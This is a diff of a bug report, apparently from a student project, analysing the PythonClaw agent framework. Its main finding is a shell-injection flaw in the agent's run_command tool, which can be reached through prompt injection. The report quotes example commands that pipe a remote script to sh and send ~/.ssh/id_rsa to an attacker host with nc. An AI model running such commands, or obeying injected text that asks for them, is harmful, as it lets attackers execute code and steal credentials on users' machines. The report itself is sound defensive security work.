@@ -1,130 +1,132 @@
-# Bug Report — Architectural Bugs in the Real PythonClaw Skills Module
+# Bug Report — Bugs in the Real PythonClaw Codebase
 
-> **Brief §3 deliverable.** Architectural bugs in the **real PythonClaw**
-> codebase ([github.com/ericwang915/PythonClaw](https://github.com/ericwang915/PythonClaw),
-> the Python port of OpenClaw published on PyPI as `pythonclaw`), surfaced by the
-> GRAPHIFY reverse-engineering of its actual source — **not** a stand-in. Every
-> number below is reproducible:
+> **Brief §3 deliverable.** Bugs found in the **real PythonClaw** source
+> ([github.com/ericwang915/PythonClaw](https://github.com/ericwang915/PythonClaw),
+> the Python port of OpenClaw, PyPI `pythonclaw`), pinned at commit `7787bb43`
+> (v0.6.6) — **not** a stand-in. Reproduce the structural analysis with:
 >
 > ```bash
-> uv run python scripts/fetch_pythonclaw.py      # clones at pinned SHA 7787bb4 (v0.6.6)
-> uv run python scripts/analyze_real_pythonclaw.py   # → results/data/real_pythonclaw_analysis.json
+> uv run python scripts/fetch_pythonclaw.py        # clone at pinned SHA
+> uv run python scripts/analyze_real_pythonclaw.py # → results/data/real_pythonclaw_analysis.json
 > ```
 >
-> Pinned source: commit `7787bb43` (v0.6.6, 2026-03-08). GRAPHIFY parses the
-> `pythonclaw/` package via AST into a dependency graph of **1,190 nodes /
-> 3,300 edges** (module/class/method/function), and a **72-module** import view.
-
-## Method (how the bugs were exposed)
-
-1. `scripts/fetch_pythonclaw.py` clones the real upstream at a pinned SHA into
-   `vendor/` (git-ignored, so the third-party 974-LOC files don't pollute our
-   own ≤150-LOC gate).
-2. `src/graphify/local_impl.py` (`LocalGraphify`, AST-based) builds the real
-   dependency graph; `scripts/analyze_real_pythonclaw.py` computes module-level
-   coupling, file sizes, fan-in/out, and import cycles.
-3. The bugs below fall straight out of those structural measures — consistent
-   with the brief's "structural bug discovery via reverse engineering" framing
-   (we do not run PythonClaw's behaviour; these are architecture smells, see PRD §6.2 L4).
+> **Honesty note.** GRAPHIFY's dependency-graph reverse engineering surfaces
+> *candidate* hotspots (large/over-connected modules). Following those leads into
+> the actual code then separates **genuine defects** from mere **smells**. Bug 1
+> below is a real, exploitable **security defect**; Bug 2 is a real architectural
+> **anti-pattern**; §3 lists the structural smells honestly labelled as smells
+> (not functional bugs). PythonClaw has **no** import cycles and **no** dead code —
+> it is structurally sound apart from these.
 
 ---
 
-## Bug 1 (architectural): God Object — `core/agent.py` (`Agent`) concentrates the whole system
+## Bug 1 (REAL — security / RCE): command injection in the agent's `run_command` tool
 
-- **Severity**: HIGH — the module the entire platform hinges on is unmaintainable and untestable in isolation.
+- **Severity**: CRITICAL — arbitrary command execution on the host via the LLM.
+- **Type**: CWE-78 (OS Command Injection). A *functional* bug, not a smell.
 
-- **Finding**: `pythonclaw/core/agent.py` is **974 LOC** (non-blank, non-comment) —
-  **6.5× the 150-line professional limit** and the single largest module in the
-  codebase. Its `Agent` class is a textbook **God Object**:
-  - `Agent.__init__` has **fan-out 27** — the constructor directly wires 27
-    distinct collaborators (LLM clients, memory manager, session store, tools,
-    skill loader, RAG retriever, compaction, …).
-  - `Agent.chat_stream` (fan-out **25**) and `Agent.chat` (fan-out **22**) are the
-    next-largest methods in the whole graph.
-  - The module carries both high **afferent** coupling (fan-in 5) and high
-    **efferent** coupling (fan-out 7) — everything depends on it *and* it depends
-    on everything.
+- **Finding.** `pythonclaw/core/tools.py` exposes `run_command(command: str)` as a
+  **PRIMITIVE_TOOL that is always available to the LLM** (registered in the tool
+  dispatch table and advertised to the model with the schema
+  `{"command": {"type": "string", "description": "The shell command to execute."}}`).
+  Its body runs the model-supplied string straight through the shell:
 
-- **Evidence**: `results/data/real_pythonclaw_analysis.json` →
-  `god_modules_by_loc[0] = [974, "core.agent"]`,
-  `top_method_fan_out[0] = [27, "core.agent.Agent.__init__"]`.
+  ```python
+  # pythonclaw/core/tools.py  (run_command)
+  result = subprocess.run(
+      command, shell=True, capture_output=True, text=True,
+      timeout=60, env=_venv_env(), cwd=_files_dir(),
+  )
+  ```
 
-- **Impact**: any change to session handling, memory, LLM routing, or skills
-  risks touching `agent.py`; it cannot be unit-tested without standing up the
-  entire stack; it is the module the RL refactoring agent most wants to **SPLIT**.
+- **Why it is a real bug (not a smell).**
+  - `shell=True` on an **LLM-controlled** string means any text the model emits —
+    or any text injected into the model via **prompt injection** (a malicious web
+    page the agent summarises, a poisoned document, a crafted chat message) —
+    executes as a shell command: `run_command("curl evil.sh | sh")`,
+    `run_command("cat ~/.ssh/id_rsa | nc attacker 443")`, etc.
+  - The author **clearly knows how to sandbox** — the *same file* carefully
+    guards file operations: `_sanitize_filename()` strips `..` and path
+    separators, `_sandbox_roots` confines reads/writes, and `write_file` is
+    "restricted to sandbox directories." **`run_command` has none of that** —
+    no allow-list, no shell-escaping, no sandbox. Setting `cwd` to a files dir is
+    no protection: `shell=True` lets the command `cd` elsewhere, chain with
+    `;`/`&&`, and reach the whole filesystem with the user's privileges.
+  - Contrast the bundled `dev/code_runner` skill, which does it **correctly** —
+    `subprocess.run([python, tmp_path], ...)` (argument list, **no shell**),
+    isolated temp file, timeout. The primitive `run_command` is the inconsistent,
+    vulnerable path.
 
-- **Recommended refactor**: extract collaborators behind interfaces and inject
-  them (Dependency Inversion) — e.g. split `Agent` into a thin orchestrator plus
-  `ChatSession`, `MemoryGateway`, `SkillDispatcher` units, dropping `__init__`
-  fan-out toward single digits and the file under 150 LOC.
+- **How reverse engineering exposed it.** GRAPHIFY flags `core/tools.py` as a
+  high-fan-in hub (the agent's tool surface, fan-in 5); reading the tool it
+  exposes reveals the `shell=True` sink. The graph pointed at the file; the code
+  review found the defect.
 
----
+- **Fix.** Drop `shell=True` and pass an argument vector
+  (`shlex.split` + `subprocess.run(args, shell=False)`), or gate `run_command`
+  behind an explicit allow-list / human-confirmation, mirroring the sandboxing the
+  file tools already use.
 
-## Bug 2 (architectural): Coupling hotspot — `core/llm/base.py` is a single point of fragility
-
-- **Severity**: MEDIUM-HIGH — the most-depended-upon module; a change here ripples to 13 modules.
-
-- **Finding**: `pythonclaw/core/llm/base.py` has the **highest afferent coupling
-  in the codebase — fan-in 13** (2.6× the next module, `session_manager`/`core.tools`
-  at 5). Thirteen modules import the LLM base abstraction directly.
-
-- **Evidence**: `results/data/real_pythonclaw_analysis.json` →
-  `top_module_fan_in[0] = ["core.llm.base", 13]`.
-
-- **Why it is a bug**: a hub with 13 dependents must be **maximally stable** and
-  minimal (Stable Dependencies Principle). In practice the LLM layer mixes the
-  base contract with three concrete clients (`anthropic_client`, `gemini_client`,
-  `openai_compatible`) and a `response` model; any change to the shared base
-  (new provider field, signature tweak) forces re-validation across all 13
-  consumers — a wide, fragile blast radius.
-
-- **Recommended refactor**: freeze a minimal `LLMClient` Protocol in `base.py`
-  (method signatures only) and move all changeable logic into the concrete
-  clients, so the 13 dependents couple only to a stable interface.
+- **Evidence**: `vendor/pythonclaw/pythonclaw/core/tools.py` — `run_command`
+  (~line 142), tool registration (~line 236), exposed schema (~line 270),
+  "PRIMITIVE_TOOLS … always available" (module docstring).
 
 ---
 
-## Bug 3 (architectural, systemic): Pervasive Single-Responsibility violation — 22 of 72 modules exceed 150 LOC
+## Bug 2 (architectural anti-pattern): God Object — `core/agent.py` (`Agent`)
 
-- **Severity**: MEDIUM — module-level erosion of separation of concerns across the codebase.
+- **Severity**: HIGH (maintainability) — the module the whole platform hinges on
+  is unmaintainable and untestable in isolation.
 
-- **Finding**: **22 of the 72 modules (31%)** exceed the 150-LOC professional
-  limit. The worst offenders after `core.agent` (974):
-  `web/app.py` **733**, `core/tools.py` **582**, `channels/telegram_bot.py` **482**,
-  `main.py` **409**, `core/skillhub.py` **357**. Total package: **11,046 LOC**.
+- **Finding.** `pythonclaw/core/agent.py` is **1,151 lines** — the largest module
+  by far. Its `Agent` class wires **27 instance collaborators** (`self.X = …`
+  assignments) in a single `__init__` (LLM clients, memory, session store, tools,
+  skill loader, RAG retriever, compaction, …); `chat_stream`/`chat` are the
+  largest methods in the whole graph (fan-out 25/22). It carries both high
+  afferent (fan-in 5) and efferent (fan-out 7) module coupling.
 
-- **Evidence**: `results/data/real_pythonclaw_analysis.json` →
-  `modules_over_150_loc` (22 entries).
+- **Why it is a real anti-pattern.** This is the classic **God Object** (Brown et
+  al., *AntiPatterns*): one class owns orchestration, state, IO, and policy. It
+  violates Single-Responsibility and Dependency-Inversion — it cannot be unit
+  tested without standing up the entire stack, and every cross-cutting change
+  touches it. (It is a *design* defect, not a crash — stated honestly.)
 
-- **Impact**: nearly a third of the codebase carries multiple responsibilities
-  per file — `web/app.py` mixes routing, websockets, and rendering;
-  `core/tools.py` is a catch-all. This is the structural debt the RL agent's
-  SPLIT/EXTRACT actions are rewarded for reducing (the `ΔModularity` / `ΔCohesion`
-  reward terms).
+- **How reverse engineering exposed it.** It is the single highest-fan-out node in
+  the GRAPHIFY graph and the largest module — the textbook signature a
+  dependency-graph analysis surfaces.
 
-- **Recommended refactor**: split each oversized module along its responsibility
-  seams (e.g. `web/app.py` → `routes/`, `ws/`, `render/`).
+- **Fix.** Extract collaborators behind interfaces and inject them — split `Agent`
+  into a thin orchestrator + `ChatSession` / `MemoryGateway` / `SkillDispatcher`,
+  dropping `__init__` wiring to single digits.
+
+---
+
+## 3. Supporting structural smells (honestly: smells, not functional bugs)
+
+These came out of the GRAPHIFY analysis (`results/data/real_pythonclaw_analysis.json`).
+They are real *maintainability* signals, **not** defects — listed for completeness,
+not claimed as bugs:
+
+- **Coupling hotspot — `core/llm/base.py`, fan-in 13.** The most-depended module.
+  But **3 of the 13** are the LLM clients correctly *implementing* the base
+  interface (healthy DIP), and **5 more** are `TYPE_CHECKING`-only imports — so the
+  effective runtime coupling is ~5 modules. A watch-item, not a bug.
+- **Oversized modules.** 22 of 72 modules exceed 150 LOC (`web/app.py` 733,
+  `core/tools.py` 582, `main.py` 409 …). This is *our* course's file-size rule, not
+  a PythonClaw defect — included only as a refactoring target for the RL agent's
+  ΔModularity/ΔCohesion reward.
 
 ---
 
 ## Appendix — Engineering defects found & fixed in our own RL training pipeline
 
-> Not PythonClaw bugs — defects in *our* harness, surfaced and fixed during the
-> build. Kept for rigor; they gate the 5-seed result in EXPERIMENTS P3-E1.
-
-- **A1 — `Categorical(logits=all_-inf)` NaN on an all-False action mask.** Fixed
-  (`5dd14ca`) by pinning the NOOP slot True before `masked_fill`
-  (`src/model/policy_net.py`); regression test `test_policy_net_categorical_safe.py`.
-- **A2 — Louvain wedge on degenerate mid-rollout topologies.** Fixed via RC-4: a
-  `signal.SIGALRM` 1-second hard cut (no daemon-thread GIL leak) + stored action
-  masks in `Trajectory`. All 5 seeds now train; regression tests
-  `test_modularity_wedge_regression.py`, `test_modularity_watchdog.py`.
-
----
+> Not PythonClaw bugs — defects in *our* harness, fixed during the build.
+- **A1 — `Categorical(logits=all_-inf)` NaN on all-False action mask.** Fixed
+  `5dd14ca` (NOOP-pin); test `test_policy_net_categorical_safe.py`.
+- **A2 — Louvain wedge on degenerate topologies.** Fixed RC-4 (SIGALRM 1-s cut +
+  stored masks); tests `test_modularity_wedge_regression.py`, `test_modularity_watchdog.py`.
 
 ## Cross-references
-
-- Pinned source + reproduction: `scripts/fetch_pythonclaw.py`, `scripts/analyze_real_pythonclaw.py`
-- Real findings artefact: `results/data/real_pythonclaw_analysis.json`
-- Real dependency graph: `results/graphify_output.gpickle` (1,190 nodes)
+- Reproduction: `scripts/fetch_pythonclaw.py`, `scripts/analyze_real_pythonclaw.py`
+- Structural evidence: `results/data/real_pythonclaw_analysis.json`, `results/graphify_output.gpickle`
 - Source decision: `docs/adr/ADR-001-pythonclaw-shim-boundary.md`
